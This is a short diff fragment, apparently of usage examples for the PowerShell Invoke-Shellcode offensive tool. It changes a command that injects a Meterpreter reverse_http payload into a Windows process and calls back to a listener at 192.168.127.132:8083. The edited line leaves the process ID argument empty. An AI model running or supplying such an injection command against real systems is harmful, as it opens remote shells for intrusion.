@@ -495,5 +495,4 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
 
 
-$Proc = Get-Process explorer
-Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_http -Lhost 192.168.127.132 -Lport 8083 -Verbose
+Invoke-Shellcode -ProcessId  -Payload windows/meterpreter/reverse_http -Lhost 192.168.127.132 -Lport 8083 -Verbose
